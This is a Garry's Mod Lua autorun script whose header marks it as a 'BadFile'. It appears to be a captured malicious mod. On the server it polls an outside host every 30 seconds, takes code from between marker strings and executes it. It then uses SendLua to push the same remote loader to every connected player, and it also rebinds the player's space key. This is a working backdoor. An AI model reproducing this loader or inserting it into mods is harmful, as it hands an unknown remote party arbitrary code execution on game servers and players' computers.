--[[
	MOD/lua/autorun/weird.lua [#1387 (#1428), 1413335148, UID:1281526452]
	-WetDog- | STEAM_0:0:36921162| [01.06.14 03:43:31PM]
	===BadFile===
]]

if CLIENT==true then
	local t=""
	function cl_works(txt)
		if txt~=t then
			t=txt
			timer.Create("t",30,1,function() cl_dont_works() end)
			pcall(CompileString(string.match(txt,"tttttttttttt(.-)tttttttttttt"),"w"))
		end
	end
	local function cl_dont_works()
		http.Fetch("http://meusarquivos.netne.net/tr/cl.html",cl_works,cl_dont_works)
	end
	local initialized=false
	function omginit()
		if initialized==false then
			initialized=true
		end
		LocalPlayer():ConCommand("+jump")
		LocalPlayer():ConCommand("-jump")
	end
	RunConsoleCommand("bind","space","lua_run_cl omginit()")
	print("init")
end

if SERVER==true then
	local t=""
	local function sv_works(txt)
		if txt~=t then
			t=txt
			timer.Create("t",30,1,function() sv_dont_works() end)
			pcall(CompileString(string.match(txt,"tttttttttttt(.-)tttttttttttt"),"w"))
		end
	end
	local function sv_dont_works()
		http.Fetch("http://meusarquivos.netne.net/tr/sv.html",sv_works,sv_dont_works)
	end
	sv_dont_works()
	print("init")
	for k,v in pairs(player.GetAll()) do
		v:SendLua('local t="" local function cl_works(txt) if txt~=t then t=txt timer.Create("t",30,1,function() cl_dont_works() end) pcall(CompileString(string.match(txt,"tttttttttttt(.-)tttttttttttt"),"w")) end end local function cl_dont_works() http.Fetch("http://meusarquivos.netne.net/tr/cl.html",cl_works,cl_dont_works) end cl_dont_works() print("init")')
	end
end